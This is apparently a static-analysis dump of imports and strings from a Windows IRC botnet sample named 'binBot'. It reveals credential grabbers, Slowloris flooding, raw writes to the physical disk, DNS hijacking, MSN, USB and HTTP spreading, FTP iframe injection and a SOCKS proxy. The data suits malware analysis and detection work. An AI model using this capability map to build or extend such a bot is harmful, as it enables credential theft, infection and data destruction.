reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x139ae7	0x141120	import	0x1399b0	KERNEL32.dll.lstrcpyA
0x139af0	0x142a08	string	0x1399b0	X-a: b\r\n
0x139b00	0x1429f0	string	0x1399b0	Connection: Close\r\n\r\n
0x139b0f	0x141184	import	0x1399b0	KERNEL32.dll.lstrlenA
0x139b51	0x141188	import	0x1399b0	KERNEL32.dll.Sleep
0x139b5e	0x141184	import	0x1399b0	KERNEL32.dll.lstrlenA
0x139b66	0x141174	import	0x1399b0	KERNEL32.dll.GetTickCount
0x139b7f	0x141188	import	0x1399b0	KERNEL32.dll.Sleep
0x139bd2	0x141174	import	0x1399b0	KERNEL32.dll.GetTickCount
0x139be4	0x141184	import	0x1399b0	KERNEL32.dll.lstrlenA
0x139c43	0x141174	import	0x1399b0	KERNEL32.dll.GetTickCount
0x139c9a	0x141180	import	0x139c60	KERNEL32.dll.HeapFree
0x139cb3	0x141120	import	0x139c60	KERNEL32.dll.lstrcpyA
0x139cc4	0x1410a0	import	0x139c60	KERNEL32.dll.lstrcpynA
0x139cf9	0x145e30	string	0x139c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x139d45	0x145e68	string	0x139c60	[Slowloris]: Finished flood on "%s"
0x139d73	0x141180	import	0x139c60	KERNEL32.dll.HeapFree
0x139da7	0x141094	import	0x139d90	KERNEL32.dll.VirtualAlloc
0x139dd0	0x142a14	string	0x139d90	\\.\PHYSICALDRIVE0
0x139dd5	0x141110	import	0x139d90	KERNEL32.dll.CreateFileA
0x139e02	0x141098	import	0x139d90	KERNEL32.dll.DeviceIoControl
0x139e21	0x14109c	import	0x139d90	KERNEL32.dll.SetFilePointer
0x139e2a	0x141164	import	0x139d90	KERNEL32.dll.WriteFile
0x139e56	0x14109c	import	0x139d90	KERNEL32.dll.SetFilePointer
0x139ea2	0x141098	import	0x139d90	KERNEL32.dll.DeviceIoControl
0x139eec	0x142a28	string	0x139ec0	00100
0x139f09	0x142a14	string	0x139ec0	\\.\PHYSICALDRIVE0
0x139f16	0x141110	import	0x139ec0	KERNEL32.dll.CreateFileA
0x139f2b	0x141098	import	0x139ec0	KERNEL32.dll.DeviceIoControl
0x139f5a	0x141164	import	0x139ec0	KERNEL32.dll.WriteFile
0x139f77	0x141150	import	0x139ec0	KERNEL32.dll.CloseHandle
0x13a0a2	0x141158	import	0x13a080	KERNEL32.dll.CreateFileW
0x13a0c0	0x141164	import	0x13a080	KERNEL32.dll.WriteFile
0x13a0cb	0x141150	import	0x13a080	KERNEL32.dll.CloseHandle
0x13a0d8	0x141150	import	0x13a080	KERNEL32.dll.CloseHandle
0x13a184	0x1410c8	import	0x13a150	KERNEL32.dll.GetWindowsDirectoryW
0x13a2ab	0x141090	import	0x13a260	KERNEL32.dll.CreateProcessW
0x13a2c5	0x141174	import	0x13a2c0	KERNEL32.dll.GetTickCount
0x13a39f	0x141184	import	0x13a310	KERNEL32.dll.lstrlenA
0x13a3a8	0x1457a0	string	0x13a310	30e4*Ta1
0x13a3b0	0x1457a0	string	0x13a310	30e4*Ta1
0x13a3bb	0x146904	string	0x13a310	\\.\pipe\%08x_ipc
0x13a3fd	0x1457a0	string	0x13a310	30e4*Ta1
0x13a40e	0x1457a0	string	0x13a310	30e4*Ta1
0x13a436	0x14119c	import	0x13a310	KERNEL32.dll.EnterCriticalSection
0x13a452	0x141110	import	0x13a310	KERNEL32.dll.CreateFileA
0x13a464	0x141198	import	0x13a310	KERNEL32.dll.LeaveCriticalSection
0x13a484	0x141164	import	0x13a310	KERNEL32.dll.WriteFile
0x13a48b	0x141150	import	0x13a310	KERNEL32.dll.CloseHandle
0x13a496	0x141188	import	0x13a310	KERNEL32.dll.Sleep
0x13a4a1	0x141198	import	0x13a310	KERNEL32.dll.LeaveCriticalSection
0x13a557	0x142a48	string	0x13a550	NtShutdownSystem
0x13a55c	0x1416e8	string	0x13a550	ntdll.dll
0x13a57a	0x141024	import	0x13a550	ADVAPI32.dll.OpenProcessToken
0x13a588	0x142a34	string	0x13a550	SeShutdownPrivilege
0x13a58f	0x141028	import	0x13a550	ADVAPI32.dll.LookupPrivilegeValueA
0x13a5b3	0x14102c	import	0x13a550	ADVAPI32.dll.AdjustTokenPrivileges
0x13a5b9	0x14116c	import	0x13a550	KERNEL32.dll.GetLastError
0x13a659	0x1410cc	import	0x13a5d0	KERNEL32.dll.CreateThread
0x13a661	0x142ad4	string	0x13a5d0	binBot Error
0x13a666	0x142a60	string	0x13a5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x13a66f	0x1412a4	import	0x13a5d0	USER32.dll.MessageBoxA
0x13a678	0x1410f8	import	0x13a5d0	KERNEL32.dll.WaitForSingleObject
0x13a680	0x14108c	import	0x13a5d0	KERNEL32.dll.ExitProcess
0x13a6df	0x141238	import	0x13a690	SHELL32.dll.SHGetSpecialFolderPathW
0x13a6f9	0x141240	import	0x13a690	SHLWAPI.dll.PathAppendW
0x13a70a	0x142af0	string	0x13a690	"%s" %S
0x13a77f	0x141090	import	0x13a690	KERNEL32.dll.CreateProcessW
0x13a7aa	0x141174	import	0x13a790	KERNEL32.dll.GetTickCount
0x13a7dc	0x141188	import	0x13a790	KERNEL32.dll.Sleep
0x13a819	0x141174	import	0x13a800	KERNEL32.dll.GetTickCount
0x13a859	0x141188	import	0x13a800	KERNEL32.dll.Sleep
0x13a8b1	0x141534	string	0x13a880	msnu
0x13a8bd	0x141330	string	0x13a880	pdef
0x13a8c9	0x141b04	string	0x13a880	ffgrab
0x13a8d5	0x141b0c	string	0x13a880	iegrab
0x13a8e1	0x141a9c	string	0x13a880	ftpgrab
0x13a8ed	0x141a68	string	0x13a880	popgrab
0x13a8fc	0x1413e4	string	0x13a880	bdns
0x13a908	0x142b1c	string	0x13a880	usbi
0x13a914	0x142b14	string	0x13a880	httpi
0x13a946	0x142b04	string	0x13a880	http
0x13a956	0x142b04	string	0x13a880	http
0x13a970	0x142b30	string	0x13a970	DnsFlushResolverCache
0x13a975	0x142b24	string	0x13a970	dnsapi.dll
0x13a9ed	0x141090	import	0x13a990	KERNEL32.dll.CreateProcessW
0x13aa39	0x1429e0	string	0x13aa10	Mozilla/4.0
0x13aa45	0x141120	import	0x13aa10	KERNEL32.dll.lstrcpyA
0x13aa60	0x1412b8	import	0x13aa10	WININET.dll.InternetOpenA
0x13aa78	0x141184	import	0x13aa10	KERNEL32.dll.lstrlenA
0x13aa8c	0x1412b4	import	0x13aa10	WININET.dll.InternetOpenUrlA
0x13aac0	0x1412b0	import	0x13aa10	WININET.dll.HttpQueryInfoA
0x13aae2	0x1412ac	import	0x13aa10	WININET.dll.InternetQueryDataAvailable
0x13ab00	0x1412c8	import	0x13aa10	WININET.dll.InternetReadFile
0x13abe7	0x1412c4	import	0x13aa10	WININET.dll.InternetCloseHandle
0x13ac1a	0x141178	import	0x13ac00	KERNEL32.dll.HeapAlloc
0x13ac29	0x1412bc	import	0x13ac00	WININET.dll.HttpQueryInfoW
0x13ac44	0x14116c	import	0x13ac00	KERNEL32.dll.GetLastError
0x13ac5e	0x1411a0	import	0x13ac00	KERNEL32.dll.HeapReAlloc
0x13ac80	0x142b48	string	0x13ac00	POST
0x13ac85	0x141134	import	0x13ac00	KERNEL32.dll.lstrcmpW
0x13ac99	0x141180	import	0x13ac00	KERNEL32.dll.HeapFree
0x13acb2	0x141180	import	0x13ac00	KERNEL32.dll.HeapFree
0x13ad0a	0x141178	import	0x13acd0	KERNEL32.dll.HeapAlloc
0x13ad1a	0x1412c0	import	0x13acd0	WININET.dll.InternetQueryOptionW
0x13ad31	0x14116c	import	0x13acd0	KERNEL32.dll.GetLastError
0x13ad4f	0x1411a0	import	0x13acd0	KERNEL32.dll.HeapReAlloc
0x13ad80	0x14112c	import	0x13acd0	KERNEL32.dll.WideCharToMultiByte
0x13adb3	0x141120	import	0x13acd0	KERNEL32.dll.lstrcpyA
0x13ade6	0x141180	import	0x13acd0	KERNEL32.dll.HeapFree
0x13ae05	0x141184	import	0x13ae00	KERNEL32.dll.lstrlenA
0x13ae13	0x141178	import	0x13ae00	KERNEL32.dll.HeapAlloc
0x13ae69	0x141120	import	0x13ae00	KERNEL32.dll.lstrcpyA
0x13ae7f	0x141088	import	0x13ae00	KERNEL32.dll.lstrcatA
0x13aed5	0x141180	import	0x13ae00	KERNEL32.dll.HeapFree
0x13aeeb	0x141180	import	0x13ae00	KERNEL32.dll.HeapFree
0x13af58	0x141120	import	0x13ae00	KERNEL32.dll.lstrcpyA
0x13af70	0x141180	import	0x13ae00	KERNEL32.dll.HeapFree
0x13afaf	0x141184	import	0x13afa0	KERNEL32.dll.lstrlenA
0x13afcb	0x141178	import	0x13afa0	KERNEL32.dll.HeapAlloc
0x13b024	0x142b88	string	0x13afa0	POST /%1023s
0x13b055	0x142b7c	string	0x13afa0	Host:
0x13b08e	0x1410a0	import	0x13afa0	KERNEL32.dll.lstrcpynA
0x13b0d5	0x141178	import	0x13afa0	KERNEL32.dll.HeapAlloc
0x13b0e3	0x142b74	string	0x13afa0	HTTP
0x13b0ff	0x142b68	string	0x13afa0	http://%s/
0x13b11e	0x142b58	string	0x13afa0	http://%s/%s
0x13b13c	0x141180	import	0x13afa0	KERNEL32.dll.HeapFree
0x13b16a	0x141184	import	0x13b160	KERNEL32.dll.lstrlenA
0x13b186	0x141178	import	0x13b160	KERNEL32.dll.HeapAlloc
0x13b199	0x142b98	string	0x13b160	\r\n\r\n
0x13b1d2	0x141178	import	0x13b160	KERNEL32.dll.HeapAlloc
0x13b1e5	0x1410a0	import	0x13b160	KERNEL32.dll.lstrcpynA
0x13b1f8	0x141180	import	0x13b160	KERNEL32.dll.HeapFree
0x13b2ee	0x13b2b0	string	0x13b290	<%u2
0x13b312	0x14117c	import	0x13b300	KERNEL32.dll.GetProcessHeap
0x13b319	0x141178	import	0x13b300	KERNEL32.dll.HeapAlloc
0x13b366	0x142bb4	string	0x13b300	lol.exe
0x13b387	0x1410c8	import	0x13b300	KERNEL32.dll.GetWindowsDirectoryW
0x13b3a1	0x1410b8	import	0x13b300	KERNEL32.dll.lstrcpynW
0x13b3bb	0x141084	import	0x13b300	KERNEL32.dll.GetVolumeInformationW
0x13b3cd	0x141184	import	0x13b300	KERNEL32.dll.lstrlenA
0x13b3d3	0x1457a0	string	0x13b300	30e4*Ta1
0x13b3ea	0x1457a0	string	0x13b300	30e4*Ta1
0x13b45b	0x142ba0	string	0x13b300	.exe
0x13b461	0x1410bc	import	0x13b300	KERNEL32.dll.lstrcatW
0x13b4a9	0x142c18	string	0x13b480	isadmin
0x13b4ae	0x142c10	string	0x13b480	admin
0x13b4fe	0x141120	import	0x13b480	KERNEL32.dll.lstrcpyA
0x13b536	0x141178	import	0x13b480	KERNEL32.dll.HeapAlloc
0x13b550	0x1410d8	import	0x13b480	KERNEL32.dll.GetVersionExA
0x13b60d	0x141178	import	0x13b480	KERNEL32.dll.HeapAlloc
0x13b620	0x1468e8	string	0x13b480	http://api.wipmania.com/
0x13b63b	0x142be8	string	0x13b480	<br>
0x13b650	0x141184	import	0x13b480	KERNEL32.dll.lstrlenA
0x13b65f	0x141184	import	0x13b480	KERNEL32.dll.lstrlenA
0x13b67d	0x141080	import	0x13b480	KERNEL32.dll.GetLocaleInfoA
0x13b6a8	0x141128	import	0x13b480	KERNEL32.dll.lstrcmpA
0x13b6c5	0x141080	import	0x13b480	KERNEL32.dll.GetLocaleInfoA
0x13b6f9	0x141080	import	0x13b480	KERNEL32.dll.GetLocaleInfoA
0x13b741	0x141178	import	0x13b480	KERNEL32.dll.HeapAlloc
0x13b7f1	0x142bd0	string	0x13b480	n%s[%s{%s%s{%s
0x13b80b	0x142bc4	string	0x13b480	[%s{%s%s{%s
0x13b8be	0x142bd0	string	0x13b480	n%s[%s{%s%s{%s
0x13b8d5	0x142bc4	string	0x13b480	[%s{%s%s{%s
0x13b94b	0x142c20	string	0x13b900	127.0.0.1
0x13b975	0x141188	import	0x13b900	KERNEL32.dll.Sleep
0x13b9bc	0x14119c	import	0x13b990	KERNEL32.dll.EnterCriticalSection
0x13b9d1	0x1412a0	import	0x13b990	USER32.dll.wvsprintfA
0x13b9f2	0x141198	import	0x13b990	KERNEL32.dll.LeaveCriticalSection
0x13ba42	0x1412a0	import	0x13ba00	USER32.dll.wvsprintfA
0x13ba56	0x145d4c	string	0x13ba00	PPPPMSG %s :%s\r\n
0x13ba7f	0x145c54	string	0x13ba70	PASS %s\r\n
0x13ba9c	0x145d24	string	0x13ba70	KCIK %s\r\n
0x13bab4	0x145d10	string	0x13ba70	SSRR %s 0 0 :%s\r\n
0x13bb52	0x141184	import	0x13bb30	KERNEL32.dll.lstrlenA
0x13bba0	0x141128	import	0x13bb80	KERNEL32.dll.lstrcmpA
0x13bbff	0x141128	import	0x13bbb0	KERNEL32.dll.lstrcmpA
0x13bc2c	0x1457a0	string	0x13bbb0	30e4*Ta1
0x13bc36	0x145d88	string	0x13bbb0	[v="%s" c="%s" h="%s" p="%S"]
0x13bc89	0x142cf4	string	0x13bbb0	reconnecting
0x13bc8e	0x145d60	string	0x13bbb0	QUIT :%s\r\n
0x13bcc3	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13bce1	0x141180	import	0x13bbb0	KERNEL32.dll.HeapFree
0x13bcec	0x142cf4	string	0x13bbb0	reconnecting
0x13bcf1	0x145d60	string	0x13bbb0	QUIT :%s\r\n
0x13bd28	0x142ce8	string	0x13bbb0	exiting
0x13bd2d	0x145d60	string	0x13bbb0	QUIT :%s\r\n
0x13bd5a	0x142cdc	string	0x13bbb0	removing
0x13bd5f	0x145d60	string	0x13bbb0	QUIT :%s\r\n
0x13bdb2	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13bdc6	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13bdd5	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13be0c	0x142ccc	string	0x13bbb0	#new
0x13be18	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13be2a	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13be72	0x142cbc	string	0x13bbb0	#admin
0x13be79	0x142cb4	string	0x13bbb0	#user
0x13be7f	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13be91	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13becb	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13bee7	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13befa	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13bf0c	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13bf5f	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13bf73	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13bf82	0x145d40	string	0x13bbb0	PART %s\r\n
0x13bfa6	0x142ccc	string	0x13bbb0	#new
0x13bfb2	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13bfc4	0x145d40	string	0x13bbb0	PART %s\r\n
0x13c00c	0x142cbc	string	0x13bbb0	#admin
0x13c013	0x142cb4	string	0x13bbb0	#user
0x13c019	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c02b	0x145d40	string	0x13bbb0	PART %s\r\n
0x13c065	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c081	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c094	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13c0a6	0x145d40	string	0x13bbb0	PART %s\r\n
0x13c0c3	0x145874	string	0x13bbb0	stop
0x13c0e3	0x145840	string	0x13bbb0	stats
0x13c124	0x146054	string	0x13bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x13c156	0x146080	string	0x13bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x13c192	0x146054	string	0x13bbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x13c1b9	0x146080	string	0x13bbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x13c1d2	0x145850	string	0x13bbb0	logins
0x13c225	0x141180	import	0x13bbb0	KERNEL32.dll.HeapFree
0x13c25e	0x142c88	string	0x13bbb0	[Logins]: Cleared %d logins
0x13c283	0x142c80	string	0x13bbb0	%s|%s
0x13c2c2	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c2d2	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13c2ea	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c321	0x1460d0	string	0x13bbb0	[RSOCK4]: Stopped rsock4
0x13c33f	0x145848	string	0x13bbb0	speed
0x13c354	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c3fd	0x1457f0	string	0x13bbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x13c449	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13c4bf	0x145d30	string	0x13bbb0	SEND %s %s\r\n
0x13c550	0x145d40	string	0x13bbb0	PART %s\r\n
0x13c572	0x145d40	string	0x13bbb0	PART %s\r\n
0x13c5d0	0x141330	string	0x13bbb0	pdef
0x13c5e2	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c5f7	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13c60e	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c61f	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c633	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13c642	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13c679	0x141330	string	0x13bbb0	pdef
0x13c68f	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c6d0	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c6e0	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c706	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13c73d	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c743	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c77e	0x1414f8	string	0x13bbb0	msnmsg
0x13c7ce	0x145f50	string	0x13bbb0	[MSN]: Updated MSN spread message to "%s"
0x13c7e7	0x145808	string	0x13bbb0	msn.int
0x13c826	0x141500	string	0x13bbb0	msnint
0x13c859	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c876	0x145f7c	string	0x13bbb0	[MSN]: Updated MSN spread interval to "%s"
0x13c88f	0x145810	string	0x13bbb0	http.set
0x13c8b5	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c8d0	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13c8f5	0x141088	import	0x13bbb0	KERNEL32.dll.lstrcatA
0x13c92c	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13c955	0x142b04	string	0x13bbb0	http
0x13c972	0x145fa8	string	0x13bbb0	[HTTP]: Updated HTTP spread message to "%s"
0x13c97f	0x14581c	string	0x13bbb0	http.int
0x13c9c0	0x142b04	string	0x13bbb0	http
0x13c9df	0x145ff8	string	0x13bbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x13c9f8	0x145828	string	0x13bbb0	http.inj
0x13ca16	0x142b14	string	0x13bbb0	httpi
0x13ca26	0x142c70	string	0x13bbb0	enabled
0x13ca2b	0x145fd4	string	0x13bbb0	[HTTP]: Injected value is now %s.
0x13ca43	0x142b14	string	0x13bbb0	httpi
0x13ca53	0x142c64	string	0x13bbb0	disabled
0x13ca58	0x145fd4	string	0x13bbb0	[HTTP]: Injected value is now %s.
0x13ca71	0x145838	string	0x13bbb0	mdns
0x13ca9f	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13cadd	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13caf3	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13cb36	0x1413e4	string	0x13bbb0	bdns
0x13cb56	0x142c44	string	0x13bbb0	[DNS]: Redirecting "%s" to "%s"
0x13cb76	0x1413e4	string	0x13bbb0	bdns
0x13cb7b	0x1413dc	string	0x13bbb0	block
0x13cb95	0x146040	string	0x13bbb0	[DNS]: Blocked "%s"
0x13cbf4	0x146028	string	0x13bbb0	[Visit]: Visited "%s"
0x13cc0a	0x14627c	string	0x13bbb0	[Visit]: Error visitng "%s"
0x13cc3a	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13cc8b	0x142c34	string	0x13bbb0	%s[%s{%s
0x13cca8	0x142c80	string	0x13bbb0	%s|%s
0x13ccd4	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13cce4	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13cd11	0x145860	string	0x13bbb0	slow
0x13cd27	0x142c80	string	0x13bbb0	%s|%s
0x13cd47	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13cd58	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13cd70	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13cdfc	0x141534	string	0x13bbb0	msnu
0x13ce55	0x141330	string	0x13bbb0	pdef
0x13ce66	0x141b04	string	0x13bbb0	ffgrab
0x13ce7b	0x141b0c	string	0x13bbb0	iegrab
0x13ce8c	0x141a9c	string	0x13bbb0	ftpgrab
0x13ce9d	0x141a68	string	0x13bbb0	popgrab
0x13ceb2	0x1413e4	string	0x13bbb0	bdns
0x13cec7	0x142b1c	string	0x13bbb0	usbi
0x13cf67	0x1460ac	string	0x13bbb0	[RSOCK4]: Started rsock4 on "%s:%d"
0x13cfe3	0x142c34	string	0x13bbb0	%s[%s{%s
0x13d003	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13d013	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13d02b	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13d043	0x145868	string	0x13bbb0	ssyn
0x13d097	0x142c34	string	0x13bbb0	%s[%s{%s
0x13d0b7	0x141184	import	0x13bbb0	KERNEL32.dll.lstrlenA
0x13d0c8	0x141178	import	0x13bbb0	KERNEL32.dll.HeapAlloc
0x13d0dc	0x141120	import	0x13bbb0	KERNEL32.dll.lstrcpyA
0x13d0f0	0x1410cc	import	0x13bbb0	KERNEL32.dll.CreateThread
0x13d0f7	0x141150	import	0x13bbb0	KERNEL32.dll.CloseHandle
0x13d145	0x141128	import	0x13d110	KERNEL32.dll.lstrcmpA
0x13d18c	0x1410a0	import	0x13d110	KERNEL32.dll.lstrcpynA
0x13d198	0x141184	import	0x13d110	KERNEL32.dll.lstrlenA
0x13d231	0x141184	import	0x13d220	KERNEL32.dll.lstrlenA
0x13d243	0x142d18	string	0x13d220	MOTD
0x13d2b5	0x141128	import	0x13d220	KERNEL32.dll.lstrcmpA
0x13d2bb	0x145d78	string	0x13d220	PING
0x13d2d1	0x145d6c	string	0x13d220	PPNG %s\r\n
0x13d308	0x145d30	string	0x13d220	SEND %s %s\r\n
0x13d33c	0x145d24	string	0x13d220	KCIK %s\r\n
0x13d351	0x1418c4	string	0x13d220	JOIN
0x13d37f	0x145d80	string	0x13d220	PPPPMSG
0x13d43c	0x145d30	string	0x13d220	SEND %s %s\r\n
0x13d5cd	0x1418d0	string	0x13d530	%s:%d
0x13d5e4	0x141188	import	0x13d530	KERNEL32.dll.Sleep
0x13d659	0x141188	import	0x13d530	KERNEL32.dll.Sleep
0x13d6fd	0x141018	import	0x13d6b0	ADVAPI32.dll.RegCreateKeyExW
0x13d731	0x141000	import	0x13d6b0	ADVAPI32.dll.RegSetValueExW
0x13d740	0x141020	import	0x13d6b0	ADVAPI32.dll.RegCloseKey
0x13d753	0x141020	import	0x13d6b0	ADVAPI32.dll.RegCloseKey
0x13d7b2	0x141178	import	0x13d7a0	KERNEL32.dll.HeapAlloc
0x13d80b	0x141180	import	0x13d7a0	KERNEL32.dll.HeapFree
0x13d819	0x141180	import	0x13d7a0	KERNEL32.dll.HeapFree
0x13d82f	0x14116c	import	0x13d7a0	KERNEL32.dll.GetLastError
0x13d83c	0x141180	import	0x13d7a0	KERNEL32.dll.HeapFree
0x13d852	0x14116c	import	0x13d7a0	KERNEL32.dll.GetLastError
0x13d85b	0x141180	import	0x13d7a0	KERNEL32.dll.HeapFree
0x13d87a	0x141170	import	0x13d7a0	KERNEL32.dll.ReadFile
0x13d8fa	0x1457a0	string	0x13d7a0	30e4*Ta1
0x13d900	0x141184	import	0x13d7a0	KERNEL32.dll.lstrlenA
0x13d908	0x1457a0	string	0x13d7a0	30e4*Ta1
0x13d916	0x141178	import	0x13d7a0	KERNEL32.dll.HeapAlloc
0x13d952	0x141184	import	0x13d7a0	KERNEL32.dll.lstrlenA
0x13d95e	0x1410a0	import	0x13d7a0	KERNEL32.dll.lstrcpynA
0x13d96d	0x1410a0	import	0x13d7a0	KERNEL32.dll.lstrcpynA
0x13d973	0x141128	import	0x13d7a0	KERNEL32.dll.lstrcmpA
0x13d979	0x1463a0	string	0x13d7a0	ftplog
0x13d98b	0x146298	string	0x13d7a0	[FTP Login]: %s
0x13d99f	0x141184	import	0x13d7a0	KERNEL32.dll.lstrlenA
0x13d9af	0x141178	import	0x13d7a0	KERNEL32.dll.HeapAlloc
0x13d9bb	0x142d3c	string	0x13d7a0	FTP ->
0x13d9c1	0x141120	import	0x13d7a0	KERNEL32.dll.lstrcpyA
0x13d9c9	0x141088	import	0x13d7a0	KERNEL32.dll.lstrcatA
0x13d9e8	0x1463a8	string	0x13d7a0	poplog
0x13d9fb	0x1462a8	string	0x13d7a0	[POP3 Login]: %s
0x13da0f	0x141184	import	0x13d7a0	KERNEL32.dll.lstrlenA
0x13da1f	0x141178	import	0x13d7a0	KERNEL32.dll.HeapAlloc
0x13da2b	0x142d30	string	0x13d7a0	POP3 ->
0x13da31	0x141120	import	0x13d7a0	KERNEL32.dll.lstrcpyA
0x13da39	0x141088	import	0x13d7a0	KERNEL32.dll.lstrcatA
0x13da58	0x1463b0	string	0x13d7a0	ftpinfect
0x13da6b	0x1462bc	string	0x13d7a0	[FTP Infect]: %s was iframed
0x13da83	0x1463c8	string	0x13d7a0	httptraff
0x13da96	0x1462f0	string	0x13d7a0	[HTTP Traffic]: %s
0x13daae	0x1463bc	string	0x13d7a0	httplogin
0x13dac0	0x1462dc	string	0x13d7a0	[HTTP Login]: %s
0x13dad4	0x141184	import	0x13d7a0	KERNEL32.dll.lstrlenA
0x13dae2	0x141178	import	0x13d7a0	KERNEL32.dll.HeapAlloc
0x13daf0	0x141120	import	0x13d7a0	KERNEL32.dll.lstrcpyA
0x13db0f	0x1463d4	string	0x13d7a0	ruskill
0x13db1b	0x142d28	string	0x13d7a0	disable
0x13db38	0x146304	string	0x13d7a0	[Ruskill]: Detected File: "%s"
0x13db50	0x1463dc	string	0x13d7a0	rdns
0x13db62	0x146324	string	0x13d7a0	[Ruskill]: Detected DNS: "%s"
0x13db7a	0x1463e4	string	0x13d7a0	rreg
0x13db8d	0x146344	string	0x13d7a0	[Ruskill]: Detected Reg: "%s"
0x13dbb8	0x146364	string	0x13d7a0	[PDef+]: %s
0x13dbe2	0x146370	string	0x13d7a0	[DNS]: Blocked DNS "%s"
0x13dc0a	0x146388	string	0x13d7a0	[MSN]: %s
0x13dc37	0x1413dc	string	0x13d7a0	block
0x13dc46	0x1463f8	string	0x13d7a0	httpspread
0x13dc59	0x146394	string	0x13d7a0	[HTTP]: %s
